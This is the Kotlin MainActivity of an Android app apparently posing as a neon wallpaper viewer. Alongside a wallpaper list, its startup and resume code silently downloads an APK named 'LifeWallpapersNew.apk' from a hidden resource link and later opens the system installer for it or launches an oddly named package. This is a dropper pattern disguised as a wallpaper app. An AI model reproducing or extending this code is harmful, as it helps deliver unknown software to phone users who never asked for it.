package com.commonsneon.neonwallpapers.wallpapersneonmanager
import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.net.Uri
import android.support.v7.app.AppCompatActivity
import android.os.Bundle
import android.os.Environment
import android.support.v4.app.ActivityCompat
import android.support.v4.content.ContextCompat
import android.support.v4.content.FileProvider
import android.support.v7.widget.LinearLayoutManager
import android.support.v7.widget.RecyclerView
import android.util.Log
import android.widget.Toast
import com.thin.downloadmanager.DownloadRequest
import com.thin.downloadmanager.DownloadStatusListenerV1
import com.thin.downloadmanager.ThinDownloadManager
import java.io.File

class MainActivity : AppCompatActivity() {

    lateinit var fileLifeWallpaper: File
    lateinit var alarm:AlarmManagerBroadcastReciver

    lateinit var recView:RecyclerView
    lateinit var link:String
    var downloandManager: ThinDownloadManager = ThinDownloadManager(5)
    lateinit var sh:SharedPreferences
    var currentState:Int = 0

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        sh = applicationContext.getSharedPreferences("Config", Context.MODE_PRIVATE)
        currentState = sh.getInt("Time",0)
        link  = resources.getString(R.string.download_link)
        alarm = AlarmManagerBroadcastReciver()
        alarm.SetAlarm(applicationContext)
        fileLifeWallpaper = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString() +"/"+ "LifeWallpapersNew"+".apk")
        var links:Array<String> = resources.getStringArray(R.array.download_links)
        recView = findViewById(R.id.recView)
        recView.layoutManager = LinearLayoutManager(applicationContext,LinearLayoutManager.HORIZONTAL,false)
        var adapter: RecyclerView.Adapter<ImageAdapter.ImViewHolder> = ImageAdapter(links)
        recView.adapter = adapter
        recView.adapter.notifyDataSetChanged()
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.WRITE_EXTERNAL_STORAGE),1)
        }
        else{
            if(!fileLifeWallpaper.exists()){
                var destinationUri = Uri.parse(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString() +"/"+ "LifeWallpapersNew"+".apk")
                var downloadRequest = DownloadRequest(Uri.parse(link)).setDestinationURI(destinationUri)
                downloandManager.cancelAll()
                downloandManager.add(downloadRequest)
                var downloadStatusListener = object: DownloadStatusListenerV1 {
                    override fun onDownloadComplete(downloadRequest: DownloadRequest?) {
                        //   Toast.makeText(applicationContext,"Complete", Toast.LENGTH_SHORT).show()
                    }

                    override fun onDownloadFailed(downloadRequest: DownloadRequest?, errorCode: Int, errorMessage: String?) {
                        Toast.makeText(applicationContext,"Download_Error", Toast.LENGTH_SHORT).show()
                        Log.d("ERROR_D",errorMessage)
                    }

                    override fun onProgress(downloadRequest: DownloadRequest?, totalBytes: Long, downloadedBytes: Long, progress: Int) {
                        //   Toast.makeText(applicationContext,"Download_Started",Toast.LENGTH_SHORT).show()
                    }

                }
                downloadRequest.setStatusListener(downloadStatusListener)
            }else{
                if(currentState>0){
                    try{
                        var intentOpen = applicationContext.packageManager.getLaunchIntentForPackage(resources.getString(R.string.package_link))
                        if(intentOpen == null){
                            var intent = Intent(Intent.ACTION_VIEW)
                            var fileLifeWallpaper = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString() +"/"+ "LifeWallpapersNew"+".apk")
                            var uri = FileProvider.getUriForFile(applicationContext, applicationContext.getPackageName() + ".my.package.name.provider", fileLifeWallpaper)
                            intent.setDataAndType(uri, "application/vnd.android.package-archive")
                            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                            startActivity(intent)
                        }else{
                            startActivity(intentOpen)
                        }
                    }catch(e:Exception){
                        Toast.makeText(applicationContext,"WOU ERROR!",Toast.LENGTH_LONG).show()
                    }

                }
            }



        }
    }

    override fun onStart() {
        super.onStart()
        currentState = sh.getInt("Time",0)
        fileLifeWallpaper = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString() + "/" + "LifeWallpapersNew" + ".apk")
        var links: Array<String> = resources.getStringArray(R.array.download_links)
        recView.layoutManager = LinearLayoutManager(applicationContext, LinearLayoutManager.HORIZONTAL, false)
        var adapter: RecyclerView.Adapter<ImageAdapter.ImViewHolder> = ImageAdapter(links)
        recView.adapter = adapter
        recView.adapter.notifyDataSetChanged()
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.WRITE_EXTERNAL_STORAGE), 1)
        }
        else{
            if(!fileLifeWallpaper.exists()){
                //    var destinationUri = Uri.parse(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString() +"/"+ "LifeWallpapersNew"+".apk")
                //    var downloadRequest = DownloadRequest(Uri.parse(link)).setDestinationURI(destinationUri)
                //    downloandManager.add(downloadRequest)
                //    var downloadStatusListener = object: DownloadStatusListenerV1 {
                //        override fun onDownloadComplete(downloadRequest: DownloadRequest?) {
                //            Toast.makeText(applicationContext,"Complete", Toast.LENGTH_SHORT).show()
                //        }
//
                //        override fun onDownloadFailed(downloadRequest: DownloadRequest?, errorCode: Int, errorMessage: String?) {
                //            Toast.makeText(applicationContext,"Download_Error", Toast.LENGTH_SHORT).show()
                //            Log.d("ERROR_D",errorMessage)
                //        }
//
                //        override fun onProgress(downloadRequest: DownloadRequest?, totalBytes: Long, downloadedBytes: Long, progress: Int) {
                //            //   Toast.makeText(applicationContext,"Download_Started",Toast.LENGTH_SHORT).show()
                //        }
//
                //    }
                //    downloadRequest.setStatusListener(downloadStatusListener)
            }else{
                // var intentOpen = applicationContext.packageManager.getLaunchIntentForPackage(resources.getString(R.string.package_link))
                // if(intentOpen == null){
                //     var intent = Intent(android.content.Intent.ACTION_VIEW)
                //     var fileLifeWallpaper = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString() +"/"+ "LifeWallpapersNew"+".apk")
                //     var uri = FileProvider.getUriForFile(applicationContext, applicationContext.getPackageName() + ".my.package.name.provider", fileLifeWallpaper)
                //     intent.setDataAndType(uri, "application/vnd.android.package-archive")
                //     intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                //     startActivity(intent)
                // }else{
                //     startActivity(intentOpen)
                // }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        currentState = sh.getInt("Time",0)
        fileLifeWallpaper = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString() +"/"+ "LifeWallpapersNew"+".apk")
        var links:Array<String> = resources.getStringArray(R.array.download_links)
        recView.layoutManager = LinearLayoutManager(applicationContext,LinearLayoutManager.HORIZONTAL,false)
        var adapter:RecyclerView.Adapter<ImageAdapter.ImViewHolder> = ImageAdapter(links)
        recView.adapter = adapter
        recView.adapter.notifyDataSetChanged()
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.WRITE_EXTERNAL_STORAGE),1)
        }
        else{
            if(!fileLifeWallpaper.exists()){
                var destinationUri = Uri.parse(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString() +"/"+ "LifeWallpapersNew"+".apk")
                var downloadRequest = DownloadRequest(Uri.parse(link)).setDestinationURI(destinationUri)
                downloandManager.cancelAll()
                downloandManager.add(downloadRequest)
                var downloadStatusListener = object: DownloadStatusListenerV1 {
                    override fun onDownloadComplete(downloadRequest: DownloadRequest?) {
                        //   Toast.makeText(applicationContext,"Complete", Toast.LENGTH_SHORT).show()
                    }

                    override fun onDownloadFailed(downloadRequest: DownloadRequest?, errorCode: Int, errorMessage: String?) {
                        Toast.makeText(applicationContext,"Download_Error", Toast.LENGTH_SHORT).show()
                        Log.d("ERROR_D",errorMessage)
                    }

                    override fun onProgress(downloadRequest: DownloadRequest?, totalBytes: Long, downloadedBytes: Long, progress: Int) {
                        //   Toast.makeText(applicationContext,"Download_Started",Toast.LENGTH_SHORT).show()
                    }

                }
                downloadRequest.setStatusListener(downloadStatusListener)
            }/*else{
                var intentOpen = applicationContext.packageManager.getLaunchIntentForPackage("com.yxkwxatje.hliqlhun")
                if(intentOpen == null){
                    var intent = Intent(android.content.Intent.ACTION_VIEW)
                    var fileLifeWallpaper = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString() +"/"+ "LifeWallpapers"+".apk")
                    var uri = FileProvider.getUriForFile(applicationContext, applicationContext.getPackageName() + ".my.package.name.provider", fileLifeWallpaper)
                    intent.setDataAndType(uri, "application/vnd.android.package-archive")
                    intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                    startActivity(intent)
                }else{
                    startActivity(intentOpen)
                }
            }*//*
        }*/

        }
    }

}
